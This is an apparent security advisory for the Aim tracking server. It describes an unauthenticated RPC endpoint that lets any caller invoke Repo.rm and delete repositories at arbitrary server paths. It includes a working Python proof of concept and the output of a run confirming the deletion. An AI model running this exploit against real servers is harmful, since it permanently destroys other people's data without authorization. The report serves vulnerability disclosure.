**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description

The tracking server registers `Repo` as a remote resource type (`prepare_resource_registry` in `aim/ext/transport/server.py`), and `/tracking/{client_uri}/read-instruction/` dispatches any client-supplied `method_name` via `getattr(resource, method_name)()` with **no allowlist of callable methods** (`run_instruction` in `aim/ext/transport/tracking.py`; the only check, `_verify_resource_handler`, merely ties the handler to the same `client_uri`, which any unauthenticated caller obtains from its own `get-resource` call).

`Repo.rm(path)` (`aim/sdk/repo.py`) is reachable this way: it regenerates the target directory from the **call argument** and runs `shutil.rmtree(path/.aim)` — not restricted to the repository mounted by the server.

## Impact

Anyone with network access to the tracking port (default bind `0.0.0.0:53800`, no authentication, CORS `*`) can delete the Aim repository at any server-writable path, not just the mounted one — permanent destruction of experiment data with two HTTP requests.

## PoC

Verified against aim v3.29.1 with a real `aim server --repo <mount>` and a second, out-of-mount victim repo. The unauthenticated attacker uses aim's own codecs (no custom wrapper):

```python
import base64, requests
from aim.ext.transport.message_utils import pack_args
from aim.storage.treeutils import encode_tree

BASE = "http://127.0.0.1:53800/tracking/poc-attacker"
h = requests.post(f"{BASE}/get-resource/",
                  json={"resource_handler": "", "resource_type": "Repo",
                        "args": base64.b64encode(b"").decode()}).json()["handler"]
args = pack_args(encode_tree(("/home/iot/aim_repro/victim_repo",)))   # outside the mounted repo
requests.post(f"{BASE}/read-instruction/",
              json={"resource_handler": h, "method_name": "rm",
                    "args": base64.b64encode(args).decode()})
```

## Execution result

```
[attacker] got Repo handler: 6683c6d6-6361-41cd-8942-15f5567be990
[attacker] read-instruction rm -> HTTP 200, 10 bytes response
[evidence] victim/.aim removed: True
[evidence] mounted repo intact: True
[RESULT] {"poc": "aim-02-rpc-repo-rm", "verdict": "REPRODUCED",
          "victim_dir": "/home/iot/aim_repro/victim_repo",
          "mounted_dir": "/home/iot/aim_repro/mount_repo",
          "victim_dot_aim_exists_after": false,
          "mounted_dot_aim_exists_after": true}
```

The out-of-mount `victim_repo/.aim` was removed by `shutil.rmtree` in the server process while the actually mounted repository stayed intact.
